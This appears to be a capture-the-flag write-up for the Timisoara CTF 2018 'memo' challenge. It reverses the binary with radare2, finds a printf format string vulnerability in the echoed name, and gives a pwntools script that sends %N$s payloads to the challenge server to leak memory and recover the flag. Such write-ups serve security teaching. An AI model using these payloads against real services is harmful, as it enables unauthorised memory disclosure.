# [Timisoara CTF 2018] memo (Pwnable-70pts)

## Discovery time !

In this task we were given a binary and `host:port` of the server.

when we connect to the server the binary ask us	for our name and display three numbers on the screen for one second. For each number, it asks us what number was on the screen. If we	have entered the three good numbers, it displays "You have a very good memory `the name you entered`" followed by	"Bye!".

    $ nc 89.38.210.128 31339
    Your name? > user1
    Let's play
    What number was on the screen? 42
    Good memory!
    What number was on the screen? 77
    Good memory!
    What number was on the screen? 111
    Good memory!
    You have a very good memory user1
    Bye!

After trying several times we realize that the binary always display the same numbers.

## Reverse time !

Now that we have discovered the binary it's now time to reverse it!
So we have disassembled the binary with radare2 and something quickly attracted our attention:
    
    $ r2 ./memo
    [0x00400a00]> pd 200 @main
     ;-- main:
     0x00400b00      55             push rbp
     0x00400b01      4889e5         mov rbp, rsp
	 ...
     0x00400dcf      48bf82114000.  movabs rdi, str.You_have_a_very_good_memory ; 0x401182 ; "You have a very good memory "
     0x00400dd9      b000           mov al, 0
     0x00400ddb      e840fbffff     call sym.imp.printf
     0x00400de0      488d7db0       lea rdi, qword [rbp - 0x50]
     0x00400de4      89854cffffff   mov dword [rbp - 0xb4], eax
     0x00400dea      b000           mov al, 0
     0x00400dec      e82ffbffff     call sym.imp.printf
     0x00400df1      48bf9f114000.  movabs rdi, str._nBye_      ; 0x40119f ; "\nBye!"
     0x00400dfb      898548ffffff   mov dword [rbp - 0xb8], eax
     0x00400e01      e8eafaffff     call sym.imp.puts
     ...

In the above extract we can see that the binary is doing something like this:

    printf("You have a very good memory ");
    printf(some_variable);
    puts("\nBye!");
 
So we can suppose that there is a format string vulnerability here.

We test with a format identifiers in our name to check that:

    $ nc 89.38.210.128 31339
    Your name? > %s
    Let's play
    ...
    You have a very good memory (null)
    Bye!
And we see that `%s` is interpreted by printf.
We definitely have a format string vulnerability here !
 
## Pwn time !

And finally, now that we found a vulnerability let's exploit it !

We found a **format string vulnerability** that means we can read all the program memory and even write in it !

First, we code a little python script to read the memory:

    from pwn import *
    import sys

    i = 0
    while True:
        i += 1
        try:
            r = remote('89.38.210.128', 31339, level='error')
            r.recvuntil("? > ")
            r.sendline("%" + str(i) + "$s")
            r.recvline()
            r.sendline("42")
            r.recvline()
            r.sendline("77")
            r.recvline()
            r.sendline("111")
            r.recvline()
            sys.stdout.write(r.recvline())
            r.close()
        except EOFError, exception:
                pass
We run it:

    $ python pwner.py
    You have a very good memory You have a very good memory n? 
    You have a very good memory 
    You have a very good memory H=���s1�H\x83�\xfe�
    ...
    You have a very good memory 1�I��^H\x89�H���PTI���@
    You have a very good memory timctf{t0_4rr1ve_4t_th3_s1mple_is_d1ff1cult}
    You have a very good memory (null)

**Et voilà !**
